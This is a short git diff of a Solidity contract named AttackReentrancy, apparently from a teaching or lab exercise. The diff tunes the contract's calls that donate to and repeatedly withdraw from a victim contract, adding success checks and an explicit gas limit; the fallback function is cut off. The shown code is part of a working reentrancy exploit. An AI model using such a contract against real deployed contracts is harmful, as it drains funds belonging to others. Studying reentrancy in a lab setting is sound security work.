@@ -36,14 +36,17 @@ contract AttackReentrancy {
 
         // Call Donate
         bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
-        victim.call{value: msg.value}(payload);
+        (bool success,  ) = victim.call{value: msg.value}(payload);
+        require(success, "donate failed");
     }
 
+    // be careful of Out of gas error when calling this function
     function maliciousWithdraw() public payable {
         // Call withdraw
         // https://www.reddit.com/r/ethdev/comments/fohqaw/understanding_the_intricacies_of_call/flihiaq/
-        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
-        victim.call(payload);
+        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.1 ether);
+        (bool success,  ) = victim.call{gas: 6000000}(payload);
+        require(success, "withdraw failed");
     }
 
     fallback() external payable {
